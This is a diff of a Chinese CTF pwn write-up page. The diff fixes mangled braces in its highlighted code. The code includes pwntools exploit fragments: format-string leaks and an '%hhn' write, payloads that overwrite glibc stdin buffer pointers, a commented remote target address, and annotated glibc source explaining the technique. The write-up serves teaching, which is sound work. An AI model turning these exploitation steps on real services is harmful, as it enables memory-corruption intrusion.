@@ -503,13 +503,13 @@
 <pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   debug_str <span class="token operator">=</span> <span class="token string">""</span>
   <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>
-    text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {;};| awk '{;{;print $1};};'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+    text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
     <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>
-      debug_str<span class="token operator">+=</span><span class="token string">'x /10xg {;};\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+      debug_str<span class="token operator">+=</span><span class="token string">'x /10xg {}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
     gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>
   <span class="token keyword">else</span><span class="token punctuation">:</span>
     <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>
-      debug_str<span class="token operator">+=</span><span class="token string">'b *{;};\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+      debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
     gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>
 </code></pre>
 <p>可以很方便调试开启了PIE的程序，把命令改掉可以换成下断点</p>
@@ -520,7 +520,7 @@ context<span class="token punctuation">.</span>log_level <span class="token oper
 <span class="token comment" spellcheck="true"># context.terminal=['tmux', 'splitw', '-h']</span>
 prog <span class="token operator">=</span> <span class="token string">'./noteplus'</span>
 <span class="token comment" spellcheck="true"># #elf = ELF(prog)</span>
-<span class="token comment" spellcheck="true"># # p = process(prog)#,env={;"LD_PRELOAD":"./libc-2.27.so"};)</span>
+<span class="token comment" spellcheck="true"># # p = process(prog)#,env={"LD_PRELOAD":"./libc-2.27.so"})</span>
 <span class="token comment" spellcheck="true"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span>
 <span class="token comment" spellcheck="true"># p = remote("121.36.245.213", 23333)</span>
 <span class="token comment" spellcheck="true">#</span>
@@ -550,19 +550,19 @@ libc<span class="token operator">=</span>ELF<span class="token punctuation">(</s
 
 <span class="token comment" spellcheck="true"># one=one_gadget_list()</span>
 
-<span class="token comment" spellcheck="true"># p = process(["/glibc/2.27/64/lib/ld-2.27.so", "./pwn"], env={;"LD_PRELOAD": "/glibc/2.27/64/lib/libc.so.6"};)</span>
+<span class="token comment" spellcheck="true"># p = process(["/glibc/2.27/64/lib/ld-2.27.so", "./pwn"], env={"LD_PRELOAD": "/glibc/2.27/64/lib/libc.so.6"})</span>
 
-<span class="token comment" spellcheck="true"># p = process(["./libc-2.27.so", "./noteplus"], env={;"LD_PRELOAD": "./libc-2.27.so"};)</span>
+<span class="token comment" spellcheck="true"># p = process(["./libc-2.27.so", "./noteplus"], env={"LD_PRELOAD": "./libc-2.27.so"})</span>
 <span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   debug_str <span class="token operator">=</span> <span class="token string">""</span>
   <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>
-    text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {;};| awk '{;{;print $1};};'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+    text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
     <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>
-      debug_str<span class="token operator">+=</span><span class="token string">'x /10xg {;};\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+      debug_str<span class="token operator">+=</span><span class="token string">'x /10xg {}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
     gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>
   <span class="token keyword">else</span><span class="token punctuation">:</span>
     <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>
-      debug_str<span class="token operator">+=</span><span class="token string">'b *{;};\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+      debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
     gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>
 
 
@@ -641,32 +641,32 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 <h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>__isoc99_scanf   调用_IO_vfscanf_internal 调用__GI__IO_default_uflow 调用_IO_new_file_underflow</p>
 <pre class=" language-c++"><code class="language-c++">int
 _IO_new_file_underflow (FILE *fp)
-{;
+{
   ssize_t count;
   /* C99 requires EOF to be "sticky".  */
   if (fp->_flags & _IO_EOF_SEEN)
     return EOF;
   if (fp->_flags & _IO_NO_READS)
-    {;
+    {
       fp->_flags |= _IO_ERR_SEEN;
       __set_errno (EBADF);
       return EOF;
-    };
+    }
   if (fp->_IO_read_ptr < fp->_IO_read_end)   //检查:_IO_read_ptr要比_IO_read_end大
     return *(unsigned char *) fp->_IO_read_ptr;
   if (fp->_IO_buf_base == NULL)//缓冲区为空分配空间
-    {;
+    {
       /* Maybe we already have a push back pointer.  */
       if (fp->_IO_save_base != NULL)
-        {;
+        {
           free (fp->_IO_save_base);
           fp->_flags &= ~_IO_IN_BACKUP;
-        };
+        }
       _IO_doallocbuf (fp);
-    };
+    }
   /* FIXME This can/should be moved to genops ?? */
   if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
-    {;
+    {
       /* We used to flush all line-buffered stream.  This really isn't
          required by any standard.  My recollection is that
          traditional Unix systems did this for stdout.  stderr better
@@ -677,7 +677,7 @@ _IO_new_file_underflow (FILE *fp)
           == (_IO_LINKED | _IO_LINE_BUF))
         _IO_OVERFLOW (stdout, EOF);
       _IO_release_lock (stdout);
-    };
+    }
   _IO_switch_to_get_mode (fp);
   /* This is very tricky. We have to adjust those
      pointers before we call _IO_SYSREAD () since
@@ -690,25 +690,25 @@ _IO_new_file_underflow (FILE *fp)
   count = _IO_SYSREAD (fp, fp->_IO_buf_base,
                        fp->_IO_buf_end - fp->_IO_buf_base);//向_IO_buf_base处写入数据,读取的实际长度是_IO_buf_end -_IO_buf_base
   if (count <= 0)
-    {;
+    {
       if (count == 0)
         fp->_flags |= _IO_EOF_SEEN;
       else
         fp->_flags |= _IO_ERR_SEEN, count = 0;
-  };
+  }
   fp->_IO_read_end += count;//读取结束后_IO_read_end加上读取的长度
   if (count == 0)
-    {;
+    {
       /* If a stream is read to EOF, the calling application may switch active
          handles.  As a result, our offset cache would no longer be valid, so
          unset it.  */
       fp->_offset = _IO_pos_BAD;
       return EOF;
-    };
+    }
   if (fp->_offset != _IO_pos_BAD)
     _IO_pos_adjust (fp->_offset, count);
   return *(unsigned char *) fp->_IO_read_ptr;
-};
+}
 
 
 </code></pre>
@@ -740,13 +740,13 @@ context<span class="token punctuation">.</span>log_level<span class="token opera
 <span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
     debug_str <span class="token operator">=</span> <span class="token string">""</span>
     <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>
-        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {;};| awk '{;{;print $1};};'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> 
+        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> 
         <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>
-            debug_str<span class="token operator">+=</span><span class="token string">'b *{;};\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
         gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span> 
     <span class="token keyword">else</span><span class="token punctuation">:</span>
         <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>
-            debug_str<span class="token operator">+=</span><span class="token string">'b *{;};\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
         gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span> 
 
 
@@ -779,13 +779,13 @@ one <span class="token operator">=</span> <span class="token punctuation">[</spa
 <span class="token comment" spellcheck="true">#leak</span>
 
 
-echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{;};$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{}$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 libc<span class="token punctuation">.</span>address<span class="token operator">=</span>get_base<span class="token punctuation">(</span><span class="token number">0x20840</span><span class="token punctuation">)</span>
 
-echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{;};$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{}$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 main_addr<span class="token operator">=</span>get_base<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#栈地址到加载地址的偏移会变</span>
 
-echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{;};$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x9</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{}$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x9</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 pie_base<span class="token operator">=</span>get_base<span class="token punctuation">(</span><span class="token number">0x1107</span><span class="token punctuation">)</span>
 
 
@@ -793,7 +793,7 @@ io_buffer_base<span class="token operator">=</span>libc<span class="token punctu
 login<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>io_buffer_base<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"io_buffer_base:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>io_buffer_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{;};$hhn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xa</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{}$hhn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xa</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 
 
 payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdin_"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">131</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>
